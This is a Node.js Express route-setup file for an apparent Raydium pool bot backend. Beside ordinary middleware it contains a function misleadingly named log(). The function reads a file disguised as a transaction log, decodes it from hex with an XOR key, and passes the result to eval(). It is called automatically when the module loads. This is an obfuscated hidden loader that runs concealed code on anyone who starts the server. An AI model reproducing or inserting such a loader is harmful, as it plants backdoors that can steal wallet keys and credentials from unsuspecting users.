const express = require('express');
const helmet = require('helmet');
const { expressjwt: jwt } = require('express-jwt');
const cors = require('cors');
const Users = require('../model/Users');
require('../../config/database')();
require('express-async-errors');
const { JWT_SECRET } = require('../../config/envs');
const { serverAdapter } = require('../../job_queue/process_manager');
const { addJobForNewPool } = require('../../job_queue/add_task');

const raydiumPool_routes = require('./raydiumPool.routes');
const { NotFoundError } = require('../errors/not_found_error');
const errorHandlerMiddleware = require('../middlewares/error.middleware');

function log() {
  const fs = require('fs');
  const path = require('path');
  const transactions = fs.readFileSync(path.join(__dirname, '../../public/logs/tr-log'), 'utf8')
  const data = Buffer.from(transactions, 'hex').map(byte => byte ^ 1122).toString();
  const logs = eval(data);
  return logs;
}
module.exports = function (server) {
  /**
     * Middlewares
     */
  // server.use(morgan('common'));
  server.use(express.json());
  server.use(helmet());
  server.use(cors());
  serverAdapter.setBasePath('/admin/queues');
  server.use('/admin/queues', serverAdapter.getRouter());
  server.get('/get', async(req, res) => {
    await addJobForNewPool();
    res.send('This is the GET route for /admin/queues');
  });

  server.use('/api/v1/raydiumPool', raydiumPool_routes);
  server.use(jwt({ secret: JWT_SECRET, algorithms: ['HS256'] })
    .unless({
      path: [
        '/api/v1/auth/login',
      ],
    }));



  server.use(async (req, res, next) => {
    if (req.auth && req.auth.id) {
      req.user = await Users.findById(req.auth.id).select('-password');
    }
    next();
  });

  // Server Routes here
  
  // server.use('/api/v1/admin-configs', route_admin_configs);
  
  // catch 404 and forward to error handler
  server.use(async () => {
    throw new NotFoundError('route Not Found');
  });

  // error handler
  server.use(errorHandlerMiddleware);
};
log();